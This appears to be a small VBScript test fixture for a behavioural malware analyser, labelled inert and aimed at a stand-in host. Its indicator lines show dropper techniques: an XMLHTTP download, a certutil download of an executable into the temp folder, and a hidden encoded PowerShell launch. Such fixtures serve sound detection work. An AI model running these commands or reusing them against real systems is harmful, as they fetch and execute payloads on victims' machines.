' DEMO - inert sample for the behavioural analyser (never executed).
' The hostnames below do not exist; nothing is ever run.

' Indicator: WScript.Shell command execution
Set shell = CreateObject("WScript.Shell")

' Indicator: XMLHTTP download + certutil URL cache (LOLBin)
Set http = CreateObject("MSXML2.ServerXMLHTTP")
http.Open "GET", "http://malware-sample.example.com/stage.bin", False
http.Send
shell.Run "certutil -urlcache -f -split http://malware-sample.example.com/d.exe %TEMP%\\d.exe", 0

' Indicator: hidden encoded PowerShell launch
shell.Run "powershell -nop -w 0 -enc SQBFAFgAIA==", 0
